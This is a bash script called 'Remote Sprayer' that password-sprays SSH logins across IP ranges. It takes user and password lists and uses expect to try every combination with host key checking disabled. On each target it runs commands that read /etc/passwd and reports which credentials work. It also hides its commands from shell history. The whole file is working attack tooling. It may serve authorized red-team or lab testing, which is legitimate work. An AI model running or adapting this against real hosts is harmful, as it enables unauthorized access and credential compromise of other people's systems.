#!/usr/bin/env bash

# *** Source library functions ***

. ./lib-cecho.sh      2>/dev/null
. ./lib-root_check.sh 2>/dev/null
. ./lib-expand_ips.sh 2>/dev/null
. ./lib-exists.sh     2>/dev/null


# *** Configuration variables ***

DEFAULT_USER='zathras'
DEFAULT_PASSWORD='password1!'

BANNER="${PURPLE}"' ____                      _            ____                                  
|  _ \ ___ _ __ ___   ___ | |_ ___     / ___| _ __  _ __ __ _ _   _  ___ _ __ 
| |_) / _ \ '\''_ ` _ \ / _ \| __/ _ \____\___ \| '\''_ \| '\''__/ _` | | | |/ _ \ '\''__|
|  _ <  __/ | | | | | (_) | ||  __/_____|__) | |_) | | | (_| | |_| |  __/ |   
|_| \_\___|_| |_| |_|\___/ \__\___|    |____/| .__/|_|  \__,_|\__, |\___|_|   
      '"${COLOR_OFF}${CYAN}"'By: Christian'"${COLOR_OFF}${PURPLE}"'                          |_|              |___/'"${COLOR_OFF}
"


# *** Helper functions ***

print_help() {
	echo -e "${CYAN}Remote Sprayer${COLOR_OFF} - ${YELLOW}Automatic persistence on targets via SSH password spraying${COLOR_OFF}"
	echo -e "    ${GREEN}Usage: $0 [-u|--user|-U|--users] [-p|--password|-P|--passwords] <target>${COLOR_OFF}"
	echo -e "           ${GREEN}$0 [-u|--user|-U|--users] [-p|--password|-P|--passwords] {-T|--targets}${COLOR_OFF}"
	echo
	echo -e "${BOLD_WHITE}TARGET(S):${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}<target>:${COLOR_OFF} A valid hostname, IP address, or IP address range that can be understood by Nmap"
	echo -e "    ${BOLD_WHITE}-T|--targets <targets_file>:${COLOR_OFF} Path to a file containing targets, one target per line"
	echo -e "${BOLD_WHITE}USER(S):${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-p|--password <password>:${COLOR_OFF} A password to authenticate with for each user logon attempt ${BOLD_WHITE}(default: $DEFAULT_PASSWORD)${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-P|--passwords <passwords_file>:${COLOR_OFF} Path to a file containing passwords, one password per line"
	echo -e "${BOLD_WHITE}PASSWORD(S):${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-u|--user <user>:${COLOR_OFF} A user to authenticate as on each target ${BOLD_WHITE}(default: $DEFAULT_USER)${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-U|--users <users_file>:${COLOR_OFF} Path to a file containing users, one user per line"
	echo -e "${BOLD_WHITE}SWITCHES:${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-q|--quiet:${COLOR_OFF} Don't print the banner ASCII art"
	echo -e "${BOLD_WHITE}HELP:${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-h|--help:${COLOR_OFF} Print this usage information"
}


# *** Argument parsing ***

# Boilerplate from: https://stackoverflow.com/questions/192249/how-do-i-parse-command-line-arguments-in-bash

# Command-line argument parsing
# Reference: https://stackoverflow.com/a/29754866
getopt --test > /dev/null
if [ $? -ne 4 ]; then
	cecho error "Your getopt version is out of date according to \`getopt --test\`. Exiting."
	exit 1
fi

# "a"  = enable the flag (boolean, true)
# "a:" = requires a value
OPTIONS=T:u:U:p:P:qh
LONGOPTS=targets:,user:,users:,password:,passwords:,quiet,help

# -temporarily store output to be able to check for errors
# -activate quoting/enhanced mode (e.g. by writing out “--options”)
# -pass arguments only via   -- "$@"   to separate them correctly
PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [ $? -ne 0 ]; then
	# e.g. return value is 1
	# then getopt has complained about wrong arguments to stdout
	print_help
	exit 2
fi
# read getopt’s output this way to handle the quoting right:
eval set -- "$PARSED"

# Command-line argument values
target=""
target_file=""
user="$DEFAULT_USER"
users_file=""
password="$DEFAULT_PASSWORD"
passwords_file=""
print_banner=true

# now enjoy the options in order and nicely split until we see --
while true; do
	case "$1" in
#		-t|--target)
#			target="$2"
#			shift 2
#			;;
		-T|--targets)
			targets_file="$2"
			shift 2
			;;
		-u|--user)
			user="$2"
			shift 2
			;;
		-U|--users)
			users_file="$2"
			shift 2
			;;
		-p|--password)
			password="$2"
			shift 2
			;;
		-P|--passwords)
			passwords_file="$2"
			shift 2
			;;
		-q|--quiet)
			print_banner=false
			shift
			;;
		-h|--help)
			print_help
			exit 0
			;;
		--)
			shift
			break
			;;
		*)
			cecho error "Command-line argument parsing programming error"
			exit 3
			;;
	esac
done

# Handle non-option arguments (starts at $1 like normal)
target="$1"

# Ensure all mandatory arguments are provided
if [ -z "$target" ] && [ -z "$targets_file" ]; then
	cecho error "Must provide a target or targets file"
	invalid_usage=true
fi

if [ -z "$user" ] && [ -z "$users_file" ]; then
	cecho error "Must provide a user or users file"
	invalid_usage=true
fi

if [ -z "$password" ] && [ -z "$passwords_file" ]; then
	cecho error "Must provide a password or passwords file"
	invalid_usage=true
fi

if [ "$invalid_usage" = true ]; then
	print_help
	exit 1
fi


# *** Process command-line arguments ***

# Print the ASCII banner
[ $print_banner = true ] && echo -e "$BANNER"

target_list=""
user_list=""
password_list=""

# If single target
if [ -n "$target" ]; then
	target_list=$(expand_ips "$target")
	if [ $? -ne 0 ]; then
		cecho error "Nmap is unable to parse '$target' as a valid target or target range"
		exit 1
	fi
else # At this point, must be a targets file
	# Check if file exists
	if [ ! -f "$targets_file" ]; then
		cecho error "Targets file '$targets_file' does not exist"
		exit 1
	fi

	# Check if file is readable
	if [ ! -r "$targets_file" ]; then
		cecho error "Unable to read targets file '$targets_file'"
		exit 1
	fi

	target_list=$(cat "$targets_file")
fi

# If single user
if [ -n "$user" ]; then
	user_list="$user"
else # At this point, must be a users file
	# Check if file exists
	if [ ! -f "$users_file" ]; then
		cecho error "Users file '$users_file' does not exist"
		exit 1
	fi

	# Check if file is readable
	if [ ! -r "$users_file" ]; then
		cecho error "Unable to read users file '$users_file'"
		exit 1
	fi

	user_list=$(cat "$users_file")
fi

# If single password
if [ -n "$password" ]; then
	password_list="$password"
else # At this point, must be a passwords file
	# Check if file exists
	if [ ! -f "$passwords_file" ]; then
		cecho error "Passwords file '$passwords_file' does not exist"
		exit 1
	fi

	# Check if file is readable
	if [ ! -r "$passwords_file" ]; then
		cecho error "Unable to read passwords file '$passwords_file'"
		exit 1
	fi

	password_list=$(cat "$passwords_file")
fi


# *** Main ***

cecho task "Attempting Logins"

# Ensure 'expect' is present
if ! exists expect; then
	cecho error "'expect' not found, exiting"
	exit 1
fi

commands="hostname; whoami; head -n 2 /etc/passwd"

# Iterate over ever possible login
for t in $target_list; do
	for u in $user_list; do
		for p in $password_list; do

			cecho log "$u:$p @ $t"
			cecho sep "-"

			creds_format="$u : $p @ [$t]"
			successful_login=false

			# Below expect code assisted by:
			# - https://linuxaria.com/howto/2-practical-examples-of-expect-on-the-linux-cli
			# - https://serverfault.com/questions/241588/how-to-automate-ssh-login-with-password

			# --- Automatic SSH login and command execution using expect
			# Don't save expect commands to our .bash_history since it would expose
			# credentials
			export HISTIGNORE="expect*"
			# Read `man expect` to learn more; there's a lot of detail

			# expect has weird issues for SSH when ran on CentOS systems like no
			# command results being printed to stdout. Replace with 'sshpass' or
			# 'runoverssh' instead? Look into alternatives.
			expect <<- EOD
				# The value of timeout must be an integral number of seconds.
				# Normally timeouts are nonnegative, but the special case of -1
				# signifies that expect #should wait forever.
				set timeout 15

				# Don't print send/expect dialogue to stdout
				#log_user 0

				# Now we can connect to the remote server/port with our username and
				# password. The command spawn is used to execute another process:
				spawn -noecho ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 $u@$t "$commands"

				# Now we expect to have a request for password:
				expect {
					"?assword:" { # Valid host
						# At this point we want to see stdout
						#log_user 1

						# And we send our password:
						send -- "$p\r"

						# Check for invalid password
						expect_background "?ermission denied" {
							exit 1
						}

						# send blank line (\r) to make sure we get back to cli
						send -- "\r"

						# No need to 'exit' the SSH session. We've already exited our
						# commands, so the server will close the connection for us.

						# In this block we can specify any final actions to carry out,
						# though we don't want to in this case:
						# (Note: It also seems like CentOS boxes don't trigger an EOF when
						#        the session is closed? They also still print out the
						#        password prompt to stdout, necessitating the earlier
						#        'log_user 0' statement.)
						#expect eof
					} "?ermission denied" {
						exit 2
					} "*timed out" {
						exit 3
					} "unreachable" { # Invalid host
						exit 4
					} "not resolve hostname" { # Invalid host
						exit 5
					}
				}
			EOD

			expect_exit_code=$?

			cecho sep "-"

			# Check the exit status of the SSH login and command execution
			case $expect_exit_code in
				0)
					cecho info "Valid credentials! $creds_format"
					successful_login=true
					;;
				1)
					cecho warning "Invalid credentials: $creds_format"
					;;
				2)
					cecho warning "Password authentication disabled: [$t]"
					;;
				3)
					cecho warning "Connection timed out: [$t]"
					;;
				4)
					cecho warning "Unreachable host: [$t]"
					;;
				5)
					cecho warning "Could not resolve target: [$t]"
					;;
				*)
					cecho error "Unrecognized exit code, programming error: $creds_format"
					;;
			esac

			# Reset HISTIGNORE
			export HISTIGNORE=""

			test $successful_login = true && break

		done
	done
done

cecho done "Done!"


#echo "target: '$target', targets_file: '$targets_file', user: '$user', users_file: '$users_file', password: '$password', passwords_file: '$passwords_file', in: '$1'"
